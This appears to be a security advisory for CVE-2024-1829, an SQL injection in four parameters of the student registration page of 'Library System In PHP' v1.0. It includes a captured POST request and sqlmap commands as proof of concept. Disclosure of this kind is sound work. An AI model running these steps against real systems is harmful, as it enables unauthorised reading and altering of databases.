# Library System In PHP - SQL Injection (Student registration)

### CVE Assigned:
**[CVE-2024-1829](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1829)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2024-1829) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2024-1829)

### Vendor Homepage:

> https://code-projects.org/

### Software Link:

> [Library System In PHP](https://code-projects.org/library-system-in-php-with-source-code/)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /Lms/Source/librarian/user/student/registration.php

> Four parameters `email`, `regno`, `phone` and `username` within student registration are vulnerable to SQL Injection.

### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Save the following request to `studentregistration.txt`:

```
POST /Lms/Source/librarian/user/student/registration.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://172.16.8.56/Lms/Source/librarian/user/index.php
Cookie: PHPSESSID=4nq5is5jf875uo0a4v5nohv7s7
Content-Length: 199
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

Connection: Keep-alive

address=555&dept=1&email=testing&name=TYYHyRvY&password=u]H[ww6KrA9F.x-F&phone=1&regno=1&sem=1&session=1&submit=Register&username=TYYHyRvY
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r studentregistration.txt --batch --dbms MYSQL --is-dba -p email
```
```
sqlmap -r studentregistration.txt --batch --dbms MYSQL --is-dba -p regno
```
```
sqlmap -r studentregistration.txt --batch --dbms MYSQL --is-dba -p phone
```
```
sqlmap -r studentregistration.txt --batch --dbms MYSQL --is-dba -p username
```


## Recommendations

When using this Library System In PHP, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
